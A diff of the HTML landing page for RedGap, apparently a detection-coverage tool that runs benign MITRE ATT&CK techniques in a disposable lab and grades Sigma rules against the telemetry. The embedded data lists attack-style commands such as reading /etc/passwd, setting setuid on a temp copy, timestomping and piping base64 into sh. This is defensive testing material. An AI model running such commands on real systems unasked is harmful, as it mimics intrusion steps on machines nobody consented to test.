@@ -217,88 +316,111 @@
 <a id="top"></a>
 <header class="hero">
   <div class="wrap">
-    <div class="eyebrow reveal">Automated MITRE ATT&amp;CK offense ↔ detection coverage · v0.1</div>
-    <h1 class="reveal">Find the <span class="gap">red gaps</span><br>in your detection.</h1>
-    <p class="tag reveal">Does your detection actually fire? Prove it — don't assume it.</p>
-    <p class="lede reveal">RedGap runs a set of <b>benign</b> ATT&amp;CK techniques against its own disposable
-      local lab, collects real telemetry with an independent collector, then
-      <b>deterministically</b> — from logs and Sigma rules, with <b>no AI in the loop</b> —
-      decides whether each technique was <b>detected</b> or is a <b>gap</b>. The verdict is a
-      pure function of <span class="mono">(events, rules)</span>, written to disk before any
-      language model is ever called.</p>
-    <div class="cta reveal">
-      <a class="btn primary" href="#run">$ pip install redgap</a>
-      <a class="btn" href="#coverage">See a live run ↓</a>
-      <a class="btn" href="https://github.com/befnoz/redgap" target="_blank" rel="noopener">View source ↗</a>
+    <div>
+      <div class="eyebrow reveal">Automated MITRE ATT&amp;CK offense ↔ detection coverage</div>
+      <h1 class="reveal">Find the <span class="gapword">red gaps</span> in your detection.</h1>
+      <p class="tag reveal">Your detections either fire — or they don't. Stop assuming. Prove it.</p>
+      <p class="lede reveal">RedGap runs <b>51 benign</b> ATT&amp;CK techniques against its own disposable
+        lab, captures <b>real</b> telemetry, and — from logs and Sigma rules, with <b>no AI in the
+        verdict</b> — tells you exactly which techniques your rules catch and which slip through.
+        The verdict is a pure function of <span class="mono">(events, rules)</span>, computed before
+        any model runs.</p>
+      <div class="cta reveal">
+        <a class="btn primary" href="#run">$ pip install redgap</a>
+        <a class="btn" href="#coverage">See the coverage grid ↓</a>
+        <a class="btn" href="https://github.com/befnoz/redgap" target="_blank" rel="noopener">Source ↗</a>
+      </div>
     </div>
-
+    <div class="reveal">
+      <div class="term" aria-hidden="true">
+        <div class="bar"><i></i><i></i><i></i><span>redgap — replay</span></div>
+        <pre id="term"></pre>
+      </div>
+    </div>
+  </div>
+  <div class="wrap statwrap">
     <div class="stats">
-      <div class="stat reveal"><div class="n g" id="s-det">26</div><div class="l">techniques detected</div></div>
-      <div class="stat reveal"><div class="n r" id="s-gap">12</div><div class="l">coverage gaps found</div></div>
+      <div class="stat reveal"><div class="n g" id="s-det">34</div><div class="l">techniques your rules caught</div></div>
+      <div class="stat reveal"><div class="n r" id="s-gap">17</div><div class="l">blind spots surfaced</div></div>
       <div class="stat reveal"><div class="n">122</div><div class="l">real SigmaHQ rules parsed, 0 crashes</div></div>
-      <div class="stat reveal"><div class="n">290</div><div class="l">tests, run fully offline</div></div>
+      <div class="stat reveal"><div class="n">324</div><div class="l">tests, fully offline in CI</div></div>
     </div>
   </div>
 </header>
 
-<noscript>
-  <div class="wrap" style="padding:16px 22px;color:var(--muted)">
-    The interactive coverage grid needs JavaScript. The same data is in
-    <a class="link" href="https://github.com/befnoz/redgap/tree/main/docs/samples">docs/samples/</a>.
-  </div>
-</noscript>
-
 <main>
 <section id="coverage">
   <div class="wrap">
-    <div class="eyebrow reveal">The run</div>
-    <h2 class="reveal">38 techniques, mapped onto the ATT&amp;CK matrix</h2>
-    <p class="sub reveal">This is a real REPLAY run over committed telemetry — 26 detected, 12 gaps,
-      and <em>two kinds</em> of gap, because a coverage tool that is all-green is just a checklist.
-      Flip to <span class="mono">after&nbsp;--fix</span> to watch the remediation round-trip close the
-      timestomp gap live.</p>
+    <div class="eyebrow reveal">The coverage grid</div>
+    <h2 class="reveal">51 techniques, mapped onto the ATT&amp;CK matrix</h2>
+    <p class="sub reveal">A real REPLAY run over committed telemetry: <b>34 detected, 17 gaps</b> — and two
+      <em>kinds</em> of gap, because an all-green report is just a checklist. The <span class="gapword">red
+      cells glow</span> — that's what RedGap is for. Or drop <em>your own</em> report below to see your grid.</p>
 
-    <div class="toggle reveal" role="group" aria-label="Coverage dataset">
-      <button id="tb-base" class="on" aria-pressed="true" onclick="setView('baseline')">sample · baseline</button>
-      <button id="tb-fix" aria-pressed="false" onclick="setView('fixed')">sample · after&nbsp;--fix</button>
-      <button id="tb-custom" aria-pressed="false" onclick="setView('custom')" style="display:none">your report</button>
-    </div>
-
-    <div class="reveal" style="display:flex;flex-wrap:wrap;gap:12px;align-items:center;margin:-6px 0 18px">
+    <div class="toolbar reveal">
+      <div class="toggle" role="group" aria-label="Coverage dataset">
+        <button id="tb-base" class="on" aria-pressed="true" onclick="setView('baseline')">sample</button>
+        <button id="tb-fix" aria-pressed="false" onclick="setView('fixed')">after&nbsp;--fix</button>
+        <button id="tb-custom" aria-pressed="false" onclick="setView('custom')" style="display:none">your report</button>
+      </div>
       <label class="btn" style="cursor:pointer;margin:0">
-        <input type="file" id="upload" accept=".json,application/json" hidden />
+        <input type="file" id="upload" accept=".json,application/json" class="sr-only" />
         ↥ Upload your coverage.json
       </label>
-      <span id="upload-note" class="muted" style="font-size:12.5px;max-width:62ch">
-        Run <span class="mono">redgap run</span> and drop your own <span class="mono">out/coverage.json</span>
-        here to see <em>your</em> coverage grid. It is parsed in your browser — nothing is uploaded, it never
-        leaves your machine.
-      </span>
+      <span id="upload-note" class="upnote">Run <span class="mono">redgap run</span> and drop your own
+        <span class="mono">out/coverage.json</span> here — parsed in your browser, nothing is uploaded.</span>
     </div>
 
     <div class="legend reveal">
-      <span><i class="swatch g"></i> detected</span>
-      <span><i class="swatch r"></i> gap · rule (closeable)</span>
-      <span><i class="swatch a"></i> gap · base-rate (needs correlation)</span>
-      <span><i class="swatch u"></i> tactic not yet tested</span>
+      <span><i class="sw g"></i> detected</span>
+      <span><i class="sw r"></i> gap · rule (write one to close it)</span>
+      <span><i class="sw a"></i> gap · base-rate (needs correlation)</span>
+      <span><i class="sw u"></i> tactic not yet tested</span>
     </div>
 
-    <div class="matrix-scroll reveal">
-      <div class="matrix" id="matrix"></div>
-    </div>
-    <p class="muted" style="font-size:12.5px;margin-top:12px">
-      38 techniques executed with real telemetry across 11 of the 14 ATT&amp;CK enterprise tactics;
-      each verdict is computed by the engine from captured logs against real SigmaHQ rules.
-    </p>
+    <div class="matrix-scroll reveal"><div class="matrix" id="matrix"></div></div>
+    <p class="dim" style="font-size:13px;margin-top:12px">51 techniques executed with real telemetry across
+      11 of the 14 ATT&amp;CK enterprise tactics; every verdict is computed by the engine from captured logs
+      against real SigmaHQ rules — never declared. <b>Click any technique</b> for its real telemetry, the rule,
+      and why.</p>
 
-    <div style="height:26px"></div>
     <div class="tbl-scroll reveal">
       <table>
-        <thead>
-          <tr><th>ATT&amp;CK</th><th>Technique</th><th>Tactic</th><th>Result</th><th>Firing rule / gap</th></tr>
-        </thead>
+        <thead><tr><th>ATT&amp;CK</th><th>Technique</th><th>Tactic</th><th>Result</th><th>Firing rule / gap</th></tr></thead>
         <tbody id="tbody"></tbody>
       </table>
+    </div>
+  </div>
+</section>
+
+<section id="use">
+  <div class="wrap">
+    <div class="eyebrow reveal">Practical use</div>
+    <h2 class="reveal">Point it at your own rules — see your own gaps</h2>
+    <p class="sub reveal">RedGap ships a demo rule set, but the real workflow is your rules. It's a measuring
+      stick you own: bring the rules, RedGap runs the attacks and shows where they don't meet.</p>
+    <div class="steps reveal">
+      <div class="step">
+        <div class="num">01 · MEASURE</div>
+        <h3>Run it against your rules</h3>
+        <p>Drop your Sigma rules into <span class="mono">rules/</span> and run. Real techniques execute in a
+          throwaway container; the engine grades them against your rules, deterministically.</p>
+        <div class="code"><span class="p">$</span> redgap run --live</div>
+      </div>
+      <div class="step">
+        <div class="num">02 · SEE</div>
+        <h3>Spot the blind spots</h3>
+        <p>Get a coverage grid: green where you're covered, <span class="gapword">red where an attacker
+          walks past</span>. Upload the <span class="mono">coverage.json</span> to this page for the live grid.</p>
+        <div class="code"><span class="c"># 34/51 detected · 17 gaps</span></div>
+      </div>
+      <div class="step">
+        <div class="num">03 · CLOSE</div>
+        <h3>Fix it &amp; gate it in CI</h3>
+        <p>Write the missing rule, re-run, watch the verdict flip <span style="color:var(--red)">red</span> →
+          <span style="color:var(--green)">green</span>. Wire RedGap into CI so a new gap fails the build.</p>
+        <div class="code"><span class="p">$</span> redgap run --fix</div>
+      </div>
     </div>
   </div>
 </section>
@@ -307,18 +429,15 @@
   <div class="wrap">
     <div class="eyebrow reveal">The one idea</div>
     <h2 class="reveal">The verdict is not the AI's to make</h2>
-    <p class="sub reveal">LLMs hallucinate confident verdicts. A coverage tool whose ground truth a model
-      can fabricate is worthless — so RedGap draws the trust boundary in code. The optional planner can
-      order the techniques and narrate the report; it <b>cannot</b> change a single verdict. A test asserts
-      the coverage is byte-identical with and without the LLM.</p>
+    <p class="sub reveal">LLMs hallucinate confident verdicts. A coverage tool whose ground truth a model can
+      fabricate is worthless — so RedGap draws the trust boundary in code. The optional planner can order the
+      techniques and narrate the report; it <b>cannot</b> change a single verdict. A test asserts the coverage
+      is byte-identical with and without the LLM.</p>
     <div class="flow reveal">
-      <div class="node llm" style="max-width:520px;margin:0 auto 4px">
-        <div class="k">LLM planner · optional</div>
-        <div class="d">orders techniques · narrates — <b>cannot set a verdict</b></div>
-      </div>
+      <div class="node llm"><div class="k">LLM planner · optional</div><div class="d">orders techniques · narrates — <b>cannot set a verdict</b></div></div>
       <div class="arrowline">▲ read-only · chooses next ▲</div>
       <div class="flowrow">
-        <div class="node"><div class="k">Technique catalog</div><div class="d">38 benign · MITRE-mapped</div></div>
+        <div class="node"><div class="k">Technique catalog</div><div class="d">51 benign · MITRE-mapped</div></div>
         <div class="node"><div class="k">Lab</div><div class="d">disposable Docker · no network</div></div>
         <div class="node"><div class="k">Collector</div><div class="d">independent LD_PRELOAD execve shim</div></div>
         <div class="node engine"><div class="k">Sigma engine</div><div class="d">deterministic · verdict = f(logs, rules)</div></div>
@@ -332,21 +451,23 @@
   <div class="wrap">
     <div class="eyebrow reveal">The point</div>
     <h2 class="reveal">Find a real blind spot — then close it</h2>
-    <p class="sub reveal">Technique T1070.006 (timestomp) fires, but no rule catches it: a <b>rule gap</b>.
-      Write one Sigma rule, re-run the same command, and the verdict flips red → green. Both the before and
-      after reports are committed. RedGap isn't a status printer — it's a loop that finds a gap and closes it.</p>
+    <p class="sub reveal">12 of the 17 gaps are <b>rule gaps</b> — real telemetry, no rule firing. Write the
+      missing rules, re-run, and every one flips green: <b>34 → 46</b>. The last 5 are <b>base-rate</b> gaps —
+      honest about needing correlation, not a single-event rule. Both reports are committed. RedGap isn't a
+      status printer — it's a loop that finds gaps and closes them.</p>
     <div class="grid2 reveal">
       <div>
         <div class="eyebrow" style="margin-bottom:8px">before</div>
         <div class="code"><span class="p">$</span> redgap run
 <span class="c"># T1070.006  Timestomp   ● gap (rule)</span>
-<span class="c"># 26/38 detected · 12 gaps</span></div>
+<span class="c"># 34/51 detected · 17 gaps</span></div>
       </div>
       <div>
-        <div class="eyebrow" style="margin-bottom:8px">after — one rule added</div>
+        <div class="eyebrow" style="margin-bottom:8px">after — the missing rules written</div>
         <div class="code"><span class="p">$</span> redgap run --fix
 <span class="c"># T1070.006  Timestomp   ● detected</span>
-<span class="c"># 27/38 detected · 11 gaps</span></div>
+<span class="c"># every rule-gap → green</span>
+<span class="c"># 46/51 detected · 5 gaps (base-rate)</span></div>
       </div>
     </div>
   </div>
@@ -362,9 +483,9 @@
       <div class="reveal">
         <div class="eyebrow" style="margin-bottom:8px">offline coverage run</div>
         <div class="code"><span class="p">$</span> pip install redgap
-<span class="p">$</span> redgap run          <span class="c"># REPLAY, prints the table + writes reports</span>
+<span class="p">$</span> redgap run          <span class="c"># REPLAY: prints the grid + writes reports</span>
 <span class="p">$</span> redgap run --fix    <span class="c"># close the timestomp gap: red → green</span></div>
-        <p class="muted" style="font-size:13px">From source instead: <span class="mono">git clone … &amp;&amp; pip install -e .</span></p>
+        <p class="dim" style="font-size:13px">From source: <span class="mono">git clone github.com/befnoz/redgap &amp;&amp; pip install -e .</span></p>
       </div>
       <div class="reveal">
         <div class="eyebrow" style="margin-bottom:8px">live against the disposable lab</div>
@@ -372,33 +493,53 @@
 <span class="c"># builds a throwaway Debian container,</span>
 <span class="c"># runs the techniques, captures real</span>
 <span class="c"># telemetry, tears the container down</span></div>
-        <p class="muted" style="font-size:13px">The lab builds and destroys itself — nothing to set up by hand.</p>
+        <p class="dim" style="font-size:13px">The lab builds and destroys itself — nothing to set up by hand.</p>
       </div>
     </div>
   </div>
 </section>
 </main>
 
-<footer id="repo">
+<footer>
   <div class="wrap">
-    <div class="row">
-      <a class="btn" href="https://github.com/befnoz/redgap" target="_blank" rel="noopener">★ Star on GitHub</a>
-      <a class="link" href="#coverage">Coverage</a>
-      <a class="link" href="#trust">Trust boundary</a>
-      <a class="link" href="#run">Quickstart</a>
+    <div class="frow">
+      <a class="btn primary" href="https://github.com/befnoz/redgap" target="_blank" rel="noopener">★ Star on GitHub</a>
+      <a class="btn" href="https://pypi.org/project/redgap/" target="_blank" rel="noopener">PyPI ↗</a>
+      <a class="ln" href="#coverage">Coverage</a>
+      <a class="ln" href="#use">How to use</a>
+      <a class="ln" href="#run">Quickstart</a>
     </div>
-    <p class="fine">RedGap attacks only its own disposable local lab — no free-form target, the live
-      container runs with no network, and every launch is gated in code. Every technique is a benign,
-      published Atomic-Red-Team-derived detection test. MIT licensed. ATT&amp;CK® is a registered trademark
-      of The MITRE Corporation. Detection content from SigmaHQ under the Detection Rule License.</p>
+    <p class="fine">RedGap attacks only its own disposable local lab — no free-form target, the live container
+      runs with no network, and every launch is gated in code (and re-audited by 100+ adversarial agents). Every
+      technique is a benign, published Atomic-Red-Team-derived detection test. MIT licensed. ATT&amp;CK® is a
+      registered trademark of The MITRE Corporation. Detection content from SigmaHQ under the Detection Rule License.</p>
   </div>
 </footer>
+
+<div class="dback" id="dback" hidden></div>
+<aside class="drawer" id="drawer" role="dialog" aria-modal="true" aria-labelledby="d-title" hidden tabindex="-1">
+  <div class="dhead">
+    <div>
+      <div class="eyebrow" id="d-eyebrow" style="color:var(--accent)">technique</div>
+      <h3 id="d-title">—</h3>
+    </div>
+    <button class="x" id="d-close" type="button" aria-label="Close details">✕</button>
+  </div>
+  <div class="dbody" id="d-body"></div>
+</aside>
+
+<noscript>
+  <div class="wrap" style="padding:16px 24px;color:var(--dim)">
+    The interactive coverage grid needs JavaScript. The same data is in
+    <a class="ln" href="https://github.com/befnoz/redgap/tree/main/docs/samples">docs/samples/</a>.
+  </div>
+</noscript>
 
 <script type="application/json" id="data">
 {
   "baseline": {
-    "detected": 26,
-    "gaps": 12,
+    "detected": 34,
+    "gaps": 17,
     "techniques": [
       {
         "id": "T1087.001",
@@ -408,7 +549,28 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000087"
+        "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000087",
+        "detail": {
+          "command": "cat /etc/passwd",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c cat /etc/passwd"
+            },
+            {
+              "image": "/usr/bin/cat",
+              "cmd": "cat /etc/passwd"
+            }
+          ],
+          "rule_title": "Local Account Discovery via /etc/passwd Read",
+          "rule_id": "7c1a9e10-1a2b-4c3d-8e4f-000000000087",
+          "rule_path": "rules/redgap/account_discovery_etc_passwd.yml",
+          "matched": {
+            "CommandLine": "cat /etc/passwd",
+            "Image": "/usr/bin/cat"
+          },
+          "why": "'Local Account Discovery via /etc/passwd Read' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1057",
@@ -418,7 +580,25 @@
         ],
         "detected": false,
         "gap_type": "base_rate",
-        "rule": ""
+        "rule": "",
+        "detail": {
+          "command": "ps aux",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c ps aux"
+            },
+            {
+              "image": "/usr/bin/ps",
+              "cmd": "ps aux"
+            }
+          ],
+          "rule_title": "",
+          "rule_id": "",
+          "rule_path": "",
+          "matched": {},
+          "why": "The signal is real but too common to alert on with a single-event rule - it needs correlation, not a standalone detection."
+        }
       },
       {
         "id": "T1136.001",
@@ -428,7 +608,35 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000136"
+        "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000136",
+        "detail": {
+          "command": "useradd -M -N -s /usr/sbin/nologin svc_demo",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c useradd -M -N -s /usr/sbin/nologin svc_demo"
+            },
+            {
+              "image": "/usr/sbin/useradd",
+              "cmd": "useradd -M -N -s /usr/sbin/nologin svc_demo"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c userdel svc_demo"
+            },
+            {
+              "image": "/usr/sbin/userdel",
+              "cmd": "userdel svc_demo"
+            }
+          ],
+          "rule_title": "Local Account Created via useradd, adduser or newusers",
+          "rule_id": "7c1a9e10-1a2b-4c3d-8e4f-000000000136",
+          "rule_path": "rules/redgap/create_account_useradd.yml",
+          "matched": {
+            "Image": "/usr/sbin/useradd"
+          },
+          "why": "'Local Account Created via useradd, adduser or newusers' fired on the real captured telemetry - matched on Image."
+        }
       },
       {
         "id": "T1548.001",
@@ -439,7 +647,51 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "c21c4eaa-ba2e-419a-92b2-8371703cbe21"
+        "rule": "c21c4eaa-ba2e-419a-92b2-8371703cbe21",
+        "detail": {
+          "command": "cp /bin/true /tmp/redgap_demo_suid",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c cp /bin/true /tmp/redgap_demo_suid"
+            },
+            {
+              "image": "/usr/bin/cp",
+              "cmd": "cp /bin/true /tmp/redgap_demo_suid"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c sh -c 'chown root /tmp/redgap_demo_suid && chmod u+s /tmp/redgap_demo_suid'"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c chown root /tmp/redgap_demo_suid && chmod u+s /tmp/redgap_demo_suid"
+            },
+            {
+              "image": "/usr/bin/chown",
+              "cmd": "chown root /tmp/redgap_demo_suid"
+            },
+            {
+              "image": "/usr/bin/chmod",
+              "cmd": "chmod u+s /tmp/redgap_demo_suid"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c rm -f /tmp/redgap_demo_suid"
+            },
+            {
+              "image": "/usr/bin/rm",
+              "cmd": "rm -f /tmp/redgap_demo_suid"
+            }
+          ],
+          "rule_title": "Setuid and Setgid",
+          "rule_id": "c21c4eaa-ba2e-419a-92b2-8371703cbe21",
+          "rule_path": "rules/proc_creation_lnx_setgid_setuid.yml",
+          "matched": {
+            "CommandLine": "sh -c sh -c 'chown root /tmp/redgap_demo_suid && chmod u+s /tmp/redgap_demo_suid'"
+          },
+          "why": "'Setuid and Setgid' fired on the real captured telemetry - matched on CommandLine."
+        }
       },
       {
         "id": "T1070.006",
@@ -449,7 +701,33 @@
         ],
         "detected": false,
         "gap_type": "rule",
-        "rule": ""
+        "rule": "",
+        "detail": {
+          "command": "touch -r /etc/hostname /tmp/redgap_agent_file",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c touch -r /etc/hostname /tmp/redgap_agent_file"
+            },
+            {
+              "image": "/usr/bin/touch",
+              "cmd": "touch -r /etc/hostname /tmp/redgap_agent_file"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c rm -f /tmp/redgap_agent_file"
+            },
+            {
+              "image": "/usr/bin/rm",
+              "cmd": "rm -f /tmp/redgap_agent_file"
+            }
+          ],
+          "rule_title": "",
+          "rule_id": "",
+          "rule_path": "",
+          "matched": {},
+          "why": "Telemetry was captured, but no shipped rule is tagged to this technique - a rule gap you can close by writing one Sigma rule."
+        }
       },
       {
         "id": "T1082",
@@ -459,7 +737,31 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "42df45e7-e6e9-43b5-8f26-bec5b39cc239"
+        "rule": "42df45e7-e6e9-43b5-8f26-bec5b39cc239",
+        "detail": {
+          "command": "uname -a",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c uname -a"
+            },
+            {
+              "image": "/usr/bin/uname",
+              "cmd": "uname -a"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "System Information Discovery",
+          "rule_id": "42df45e7-e6e9-43b5-8f26-bec5b39cc239",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_system_info_discovery.yml",
+          "matched": {
+            "Image": "/usr/bin/uname"
+          },
+          "why": "'System Information Discovery' fired on the real captured telemetry - matched on Image."
+        }
       },
       {
         "id": "T1016",
@@ -469,7 +771,31 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "e7bd1cfa-b446-4c88-8afb-403bcd79e3fa"
+        "rule": "e7bd1cfa-b446-4c88-8afb-403bcd79e3fa",
+        "detail": {
+          "command": "cat /etc/resolv.conf",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c cat /etc/resolv.conf"
+            },
+            {
+              "image": "/usr/bin/cat",
+              "cmd": "cat /etc/resolv.conf"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "System Network Discovery - Linux",
+          "rule_id": "e7bd1cfa-b446-4c88-8afb-403bcd79e3fa",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_system_network_discovery.yml",
+          "matched": {
+            "CommandLine": "sh -c cat /etc/resolv.conf"
+          },
+          "why": "'System Network Discovery - Linux' fired on the real captured telemetry - matched on CommandLine."
+        }
       },
       {
         "id": "T1069.001",
@@ -479,7 +805,31 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "676381a6-15ca-4d73-a9c8-6a22e970b90d"
+        "rule": "676381a6-15ca-4d73-a9c8-6a22e970b90d",
+        "detail": {
+          "command": "groups",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c groups"
+            },
+            {
+              "image": "/usr/bin/groups",
+              "cmd": "groups"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Local Groups Discovery - Linux",
+          "rule_id": "676381a6-15ca-4d73-a9c8-6a22e970b90d",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_local_groups.yml",
+          "matched": {
+            "Image": "/usr/bin/groups"
+          },
+          "why": "'Local Groups Discovery - Linux' fired on the real captured telemetry - matched on Image."
+        }
       },
       {
         "id": "T1518.001",
@@ -489,7 +839,32 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "c9d8b7fd-78e4-44fe-88f6-599135d46d60"
+        "rule": "c9d8b7fd-78e4-44fe-88f6-599135d46d60",
+        "detail": {
+          "command": "grep falcond /etc/passwd || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c grep falcond /etc/passwd || true"
+            },
+            {
+              "image": "/usr/bin/grep",
+              "cmd": "grep falcond /etc/passwd"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Security Software Discovery - Linux",
+          "rule_id": "c9d8b7fd-78e4-44fe-88f6-599135d46d60",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_security_software_discovery.yml",
+          "matched": {
+            "CommandLine": "grep falcond /etc/passwd",
+            "Image": "/usr/bin/grep"
+          },
+          "why": "'Security Software Discovery - Linux' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1083",
@@ -499,7 +874,31 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "d3feb4ee-ff1d-4d3d-bd10-5b28a238cc72"
+        "rule": "d3feb4ee-ff1d-4d3d-bd10-5b28a238cc72",
+        "detail": {
+          "command": "find /etc -name hosts",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c find /etc -name hosts"
+            },
+            {
+              "image": "/usr/bin/find",
+              "cmd": "find /etc -name hosts"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "File and Directory Discovery - Linux",
+          "rule_id": "d3feb4ee-ff1d-4d3d-bd10-5b28a238cc72",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_file_and_directory_discovery.yml",
+          "matched": {
+            "Image": "/usr/bin/find"
+          },
+          "why": "'File and Directory Discovery - Linux' fired on the real captured telemetry - matched on Image."
+        }
       },
       {
         "id": "T1033",
@@ -509,7 +908,29 @@
         ],
         "detected": false,
         "gap_type": "base_rate",
-        "rule": ""
+        "rule": "",
+        "detail": {
+          "command": "whoami",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c whoami"
+            },
+            {
+              "image": "/usr/bin/whoami",
+              "cmd": "whoami"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "",
+          "rule_id": "",
+          "rule_path": "",
+          "matched": {},
+          "why": "The signal is real but too common to alert on with a single-event rule - it needs correlation, not a standalone detection."
+        }
       },
       {
         "id": "T1518",
@@ -519,7 +940,33 @@
         ],
         "detected": false,
         "gap_type": "rule",
-        "rule": ""
+        "rule": "",
+        "detail": {
+          "command": "dpkg -l || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c dpkg -l || true"
+            },
+            {
+              "image": "/usr/bin/dpkg",
+              "cmd": "dpkg -l"
+            },
+            {
+              "image": "/usr/bin/dpkg-query",
+              "cmd": "dpkg-query --list --"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "",
+          "rule_id": "",
+          "rule_path": "",
+          "matched": {},
+          "why": "Telemetry was captured, but no shipped rule is tagged to this technique - a rule gap you can close by writing one Sigma rule."
+        }
       },
       {
         "id": "T1140",
@@ -529,7 +976,39 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "ba592c6d-6888-43c3-b8c6-689b8fe47337"
+        "rule": "ba592c6d-6888-43c3-b8c6-689b8fe47337",
+        "detail": {
+          "command": "echo bHM= | base64 -d | sh",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c echo bHM= | base64 -d | sh"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh"
+            },
+            {
+              "image": "/usr/bin/base64",
+              "cmd": "base64 -d"
+            },
+            {
+              "image": "/usr/bin/ls",
+              "cmd": "ls"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Linux Base64 Encoded Pipe to Shell",
+          "rule_id": "ba592c6d-6888-43c3-b8c6-689b8fe47337",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_base64_execution.yml",
+          "matched": {
+            "CommandLine": "sh -c echo bHM= | base64 -d | sh"
+          },
+          "why": "'Linux Base64 Encoded Pipe to Shell' fired on the real captured telemetry - matched on CommandLine."
+        }
       },
       {
         "id": "T1222.002",
@@ -539,7 +1018,40 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "34979410-e4b5-4e5d-8cfb-389fdff05c12"
+        "rule": "34979410-e4b5-4e5d-8cfb-389fdff05c12",
+        "detail": {
+          "command": "touch /tmp/redgap_imm && chattr -i /tmp/redgap_imm 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c touch /tmp/redgap_imm && chattr -i /tmp/redgap_imm 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/touch",
+              "cmd": "touch /tmp/redgap_imm"
+            },
+            {
+              "image": "/usr/bin/chattr",
+              "cmd": "chattr -i /tmp/redgap_imm"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c rm -f /tmp/redgap_imm"
+            },
+            {
+              "image": "/usr/bin/rm",
+              "cmd": "rm -f /tmp/redgap_imm"
+            }
+          ],
+          "rule_title": "Remove Immutable File Attribute",
+          "rule_id": "34979410-e4b5-4e5d-8cfb-389fdff05c12",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_chattr_immutable_removal.yml",
+          "matched": {
+            "CommandLine": "chattr -i /tmp/redgap_imm",
+            "Image": "/usr/bin/chattr"
+          },
+          "why": "'Remove Immutable File Attribute' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1070.004",
@@ -549,7 +1061,39 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "30aed7b6-d2c1-4eaf-9382-b6bc43e50c57"
+        "rule": "30aed7b6-d2c1-4eaf-9382-b6bc43e50c57",
+        "detail": {
+          "command": "touch /tmp/redgap_shred && shred -u /tmp/redgap_shred",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c touch /tmp/redgap_shred && shred -u /tmp/redgap_shred"
+            },
+            {
+              "image": "/usr/bin/touch",
+              "cmd": "touch /tmp/redgap_shred"
+            },
+            {
+              "image": "/usr/bin/shred",
+              "cmd": "shred -u /tmp/redgap_shred"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c rm -f /tmp/redgap_shred"
+            },
+            {
+              "image": "/usr/bin/rm",
+              "cmd": "rm -f /tmp/redgap_shred"
+            }
+          ],
+          "rule_title": "File Deletion",
+          "rule_id": "30aed7b6-d2c1-4eaf-9382-b6bc43e50c57",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_file_deletion.yml",
+          "matched": {
+            "Image": "/usr/bin/shred"
+          },
